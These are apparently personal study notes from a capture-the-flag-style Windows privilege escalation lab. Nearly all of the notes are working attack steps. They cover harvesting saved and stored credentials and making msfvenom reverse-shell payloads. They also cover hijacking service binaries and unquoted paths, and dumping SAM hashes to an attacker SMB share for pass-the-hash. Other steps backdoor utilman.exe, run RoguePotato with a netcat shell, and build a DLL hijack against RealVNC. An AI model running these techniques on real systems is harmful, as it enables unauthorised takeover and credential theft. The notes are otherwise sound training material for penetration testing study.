![[Screenshot 2022-06-23 at 08.51.11.png]]
![[Screenshot 2022-06-23 at 08.51.28.png]]

Harvesting Easily-Grabbed Passwords
===
![[Screenshot 2022-06-23 at 08.56.28.png]]

PS History
===
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` 

Saved Win Credentials
===
`cmkdkey /list`
--> `runas /savecred /user:admin cmd.exe`

IIS Configuration
===
![[Screenshot 2022-06-23 at 09.06.58.png]]
To find DB connection strings run `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
![[Screenshot 2022-06-23 at 09.08.49.png]]

Retreiving Credentials from Software: PuTTY
===
Command to search under registry key for proxypassword = `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

Scheduled Tasks
===
`schtasks` or `schtasks /query /tn vulntask /fo list /v`
`icacls` --> shows file permissions of an executable

AlwaysInstallElevated
===
.msi files
1. Query the 2 registry values needed to be set with ``` C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer ``` and 
```C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
2. generate malicious .msi file `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.102.14 LPORT=LOCAL_PORT -f msi -o malicious.msi`
3. set up and run metasploit handler rightly, then run `C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` and it should work

Abusing Service Misconfigs
===
`sc qc <serviceName>` shows details about running service.
Use _ProcessHacker_ + _Registry Editor_ programs to look more into the services.
(servicename(used) = _apphostsvc_)
Insecure Permissions on Service Executable
===
1. `sc qc WindowsScheduler`
2. `icacls c:\<BINARY_PATH_NAME from above>` (_c:\progra~2\system~1\wservice.exe_)
3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe` 
4. set up python server and transfer it to target machine with wget (in PS)
5. replace ervice with payload `>move c:\progra~2\system~1\WService.exe c:\progra~2\system~1\WService.exe.bkp` + `move rev-svc.exe c:\progra~2\system~1\WService.exe`
6. grant full permission to everyone with `icacls c:\progra~2\system~1\WService.exe /grant Everyone:F`
7. set up nc listener on attacker machine and restart service `sc stop windowsscheduler` + `sc start windowsscheduler`

Unquoted Service Paths
===
_essentially it is a form of path manipulation, as when the machine runs "disk sorter enterprise" and there is a "disk" program in the programs folder, it will execute this before the actual "Disk Sorter Enterprise" file_
1. create the payload (same msfvenom command as previous)
2. transfer it to c:\MyPrograms as _Disk.exe_
3. grant full permissions to everyone with `icacls Disk.exe /grant Everyone:F`
4. `sc stop "disk sorter enterprise"` + `sc start "disk sorter enterprise"`
5. the listener now catches a shell

Insecure Service Permissions
===
_accesschk_ is used to check for service DACL from the command line
1. `accesschk64.exe -qlc <serviceName>`
2. repeat the same process with the rsv-svc.exe payload generated in the previous 2 'tasks' (transfer + grant access)
3. `sc config THMService binPath= "C:\Users\thm-unpriv\Desktop\sc.exe" obj= LocalSystem` --> to change service's associated executable and account
4. stop + start the service (THMService)
	1. best done from base directory

Windows Privileges
===
`whoami /priv`
### SeBackup/SeRestore
1. To backup SAM and SYSTEM hashes:
 `reg save hklm\sam C:\Users\THMBackup\sam.hive` + `reg save hklm\system C:\Users\THMBackup\system.hive` 
2. `/opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share` to set up SMB server
3. copy files with `copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\` and `copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\`
4. dump the hashes with share$`/opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`
5. crack the hash `/opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.108.107` / get access as system(shell)

### SeTakeOwnership
_utilman.exe_ --> take ownership of this which is on the lock screen
1. `takeown /f c:\windows\system32\utilman.exe`
2. give yourself full permission over the file with `icacls c:\windows\system32\utilman.exe /grant THMTakeOwnership:F`
3. `copy cmd.exe utilman.exe`
4. next, lock the user account + press ease of access button
(I really like this method!)
 
 ### SeImpersonate/SeAssignPrimaryToken
_RoguePotato_ exploit
1. set up socat `sudo socat tcp-l:135,reuseaddr,fork tcp:10.10.108.107:9999` + `nc -lvnp 4448`
2. `c:\tools\roguepotato\RoguePotato.exe -r 10.11.59.68 -e "C:\tools\nc64 -e cmd.exe 10.11.59.68 4448" -l 9999` run in webshell --> it will spawn a shell in nc listener as nt authority\system

Abusing Vulnerable Software
===
`wmic <product> get name,version,vendor` (or just `wmic product`)?

##### RealVNC 6.8.0 exploit
when running a 'repair' of the software _MSIExec.exe_ is run --> with SYSTEM privs.
Create an evil _adsldpc.dll_ file and store in application folder - which will be execute before the original dll file.

1. create proxy dll (to forward all the function calls to the origincal file rather than creating a bunch of them or ignoring them which sould likely crash the program):
```c 
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("whoami > C:\\output.txt");
    }

    return TRUE;
}
```
--> store as _proxy.c_
```
EXPORTS
    Method1=C:/Windows/System32/original.dll.Method1 @1
    Method2=C:/Windows/System32/original.dll.Method2 @2
```
--> _proxy.def_
2. `mkdir share` + `/opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public share`
3. `copy c:\windows\system32\adsldpc.dll \\10.11.59.68\public`
4. use the modified script of [this](https://github.com/Cobalt-Strike/ProxyDLLExample/blob/main/get_exports.py):
```python
import pefile
import argparse

parser = argparse.ArgumentParser(description='Target DLL.')
parser.add_argument('--target', required=True, type=str,help='Target DLL')
parser.add_argument('--originalPath', required=True, type=str,help='Original DLL path')

args = parser.parse_args()

target = args.target
original_path = args.originalPath.replace('\\','/')

dll = pefile.PE(target)

print("EXPORTS", end="\r\n")

for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        print(f"    {export.name.decode()}={original_path}.{export.name.decode()} @{export.ordinal}", end="\r\n")
```
5. run `python3 get_exports.py --target share/adsldpc.dll --originalPath 'C:\Windows\System32\adsldpc.dll' > proxy.def`
6. compile the DLL with `x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel` + `x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll`
7. copy this to machine (e.g. w curl) + move it: `move proxy.dll c:\users\thm-unpriv\appdata\local\temp\adsldpc.dll`
8. trigger it by opening _add or remove programs_ from start menu + search vnc
	1. _modify_ it + chose _repair_ option when asked what you want to do with it
9. there should now be a file on _c:\output.txt_ 
10. modify the _proxy.c_ file with the payload of choice: `c:\tools\nc64.exe -e cmd.exe 10.11.59.68 4448` + set up listener, and a shell with system privileges was spawned:)